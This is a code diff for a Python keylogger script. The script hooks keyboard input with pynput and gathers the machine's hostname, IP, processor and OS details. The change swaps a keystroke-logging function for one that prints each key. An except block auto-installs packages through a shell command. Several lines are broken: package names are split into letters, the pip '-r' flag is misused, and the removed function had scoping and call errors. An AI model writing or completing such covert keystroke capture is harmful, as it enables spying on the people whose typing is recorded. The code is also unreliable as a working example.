@@ -4,13 +4,12 @@ try:
     from pynput.keyboard import Listener
     import socket
     import platform
-    KEYS_LOG = ''
+
 
 except ModuleNotFoundError:
-    packages = ["keyboard","socket","pynput"]
+    packages = ["keyboard","pynput"]
     for package in packages:
-        print("package" + "" + package)
-        subprocess.call("pip install " + ' '.join(package), shell=True)
+        subprocess.call("python3 -m pip install -r" + ' '.join(package), shell=True)
         
     
 
@@ -21,14 +20,12 @@ finally:
     USER_SYSTEM = platform.system()
     USER_MACHINE = platform.machine()
     USER_DATA = USER_HOSTNAME + "\n" + USER_IP + "\n" + USER_PROCESSOR + "\n" + USER_SYSTEM + "\n" + USER_MACHINE
-    
-    def store_data(key):
-        KEYS_LOG = KEYS_LOG + key.char
-        on_press()
+    data = ''
         
         
     def on_press(key):
-        store_data(key)
+        print(key)
+        
 
     with Listener(on_press=on_press) as listener: 
         listener.join()  
